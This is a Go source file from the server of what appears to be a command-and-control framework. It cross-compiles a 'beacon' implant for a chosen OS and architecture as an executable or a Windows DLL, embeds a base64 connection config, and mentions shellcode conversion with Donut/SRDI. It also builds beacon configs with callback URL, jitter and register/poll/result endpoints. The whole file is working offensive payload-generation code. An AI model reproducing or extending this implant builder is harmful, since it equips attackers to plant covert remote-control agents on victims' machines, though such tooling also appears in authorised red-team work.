package server

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// c2GeneratedBuildEnv returns the Go toolchain + beacon source dir used for
// on-demand cross-compilation. Available when running from the repo source or
// when RESTXTRA_BEACON_SRC points at a checkout.
func (s *Server) c2BuildEnv() (goBin, srcDir string, ok bool) {
	goBin, err := exec.LookPath("go")
	if err != nil {
		return "", "", false
	}
	for _, cand := range []string{os.Getenv("RESTXTRA_BEACON_SRC"), "."} {
		if cand == "" {
			continue
		}
		if _, err := os.Stat(filepath.Join(cand, "cmd", "beacon")); err == nil {
			return goBin, cand, true
		}
	}
	return goBin, "", false
}

// buildBeaconArtifact cross-compiles the beacon agent with the config embedded
// and stores it under <dataDir>/c2artifacts. Supports:
//
//	stageless  CGO_ENABLED=0 cross-compiled executable (default, all OS/arch)
//	dll        Windows shared library (-buildmode=c-shared, needs CGO+mingw)
//	shellcode  not built here (requires an external Donut/SRDI toolchain)
func (s *Server) buildBeaconArtifact(id int64, goos, goarch, format string, configJSON []byte) (string, int64, error) {
	dir := filepath.Join(s.dataDir, "c2artifacts")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return "", 0, err
	}
	ext := ""
	if goos == "windows" {
		ext = ".exe"
	}
	if format == "dll" && goos == "windows" {
		ext = ".dll"
	}
	outPath := filepath.Join(dir, fmt.Sprintf("beacon_%d_%s_%s%s", id, goos, goarch, ext))

	b64 := base64.StdEncoding.EncodeToString(configJSON)
	ldflags := "-X main.builtinConfig=" + b64

	env := append(os.Environ(),
		"GOOS="+goos,
		"GOARCH="+goarch,
	)
	buildMode := ""
	if format == "dll" {
		buildMode = "-buildmode=c-shared"
		env = append(env, "CGO_ENABLED=1")
	} else {
		env = append(env, "CGO_ENABLED=0")
	}

	args := []string{"build"}
	if buildMode != "" {
		args = append(args, buildMode)
	}
	args = append(args, "-ldflags", ldflags, "-o", outPath, "./cmd/beacon")

	cmd := exec.Command(s.goBin(), args...)
	cmd.Dir = s.beaconSrcDir()
	cmd.Env = env
	out, err := cmd.CombinedOutput()
	if err != nil {
		_ = os.Remove(outPath)
		return "", 0, fmt.Errorf("build failed (%s): %s", format, strings.TrimSpace(string(out)))
	}
	st, err := os.Stat(outPath)
	if err != nil {
		return "", 0, err
	}
	return outPath, st.Size(), nil
}

func (s *Server) goBin() string {
	b, _, _ := s.c2BuildEnv()
	return b
}

func (s *Server) beaconSrcDir() string {
	_, dir, _ := s.c2BuildEnv()
	return dir
}

// c2GeneratedConfig builds the beacon connection config JSON for a generated
// client. scheme is "http" or "https" (from the listener protocol).
func (s *Server) c2GeneratedConfig(scheme, host string, port int, format, sid string, interval, jitter int) []byte {
	cfg := map[string]any{
		"server_url":   fmt.Sprintf("%s://%s:%d", scheme, host, port),
		"session_id":   sid,
		"interval":     interval,
		"jitter":       jitter,
		"register_uri": "/register",
		"poll_uri":     "/poll",
		"result_uri":   "/result",
		"format":       format,
	}
	b, _ := json.Marshal(cfg)
	return b
}
